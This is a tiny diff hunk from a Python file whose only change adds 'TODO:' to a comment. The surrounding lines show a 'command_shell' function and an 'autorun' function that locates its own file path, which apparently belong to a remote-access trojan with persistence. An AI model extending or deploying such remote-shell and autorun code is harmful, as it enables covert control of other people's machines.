@@ -136,7 +136,7 @@ def command_shell():
         time.sleep(0.1)
         send(bytData)
 
-# change from python to exe
+# TODO: change from python to exe
 def autorun():
     USER_NAME = getpass.getuser()
     file_path = os.path.dirname(os.path.realpath(__file__)) + "\\" + os.path.basename(os.path.realpath(__file__))
